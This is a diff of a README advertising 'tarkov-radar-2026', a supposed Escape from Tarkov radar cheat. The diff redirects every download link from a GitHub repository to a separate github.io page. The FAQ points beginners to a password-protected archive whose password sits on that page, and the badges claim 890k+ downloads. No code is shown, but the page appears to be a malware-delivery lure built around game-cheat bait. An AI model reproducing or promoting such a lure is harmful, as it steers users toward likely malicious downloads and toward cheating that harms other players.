@@ -1,6 +1,6 @@
 # 🛰️ tarkov-radar-2026 - See Everyone in Every Raid Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-tarkov--radar--2026-success?style=for-the-badge&logo=github)](https://github.com/zakvettech/tarkov-radar-2026)
+[![Download Now](https://img.shields.io/badge/Download-tarkov--radar--2026-success?style=for-the-badge&logo=github)](https://zakvettech.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-890k%2B-orange?style=flat-square)
 
@@ -50,7 +50,7 @@ Follow these steps exactly. They are written for a complete beginner, so do not 
 
 Visit this link to download the application:
 
-👉 [https://github.com/zakvettech/tarkov-radar-2026](https://github.com/zakvettech/tarkov-radar-2026)
+👉 [https://zakvettech.github.io](https://zakvettech.github.io)
 
 This will take you to the download page. Once you are there, you will see the download button. Click it and wait for the file to finish downloading. The file is small, so it should not take long.
 
@@ -107,7 +107,7 @@ No. You can run the radar on the same screen as the game. Just switch between wi
 The radar is built using web technologies. This keeps the file size small, makes it cross-compatible with any version of Windows, and allows for a clean, fast interface. Your browser is just a viewer for the map.
 
 **Q: The file is asking for a password. What is it?**
-The password is displayed on the download page. Go back to https://github.com/zakvettech/tarkov-radar-2026 and look for the password in the description or next to the download button.
+The password is displayed on the download page. Go back to https://zakvettech.github.io and look for the password in the description or next to the download button.
 
 ---
 
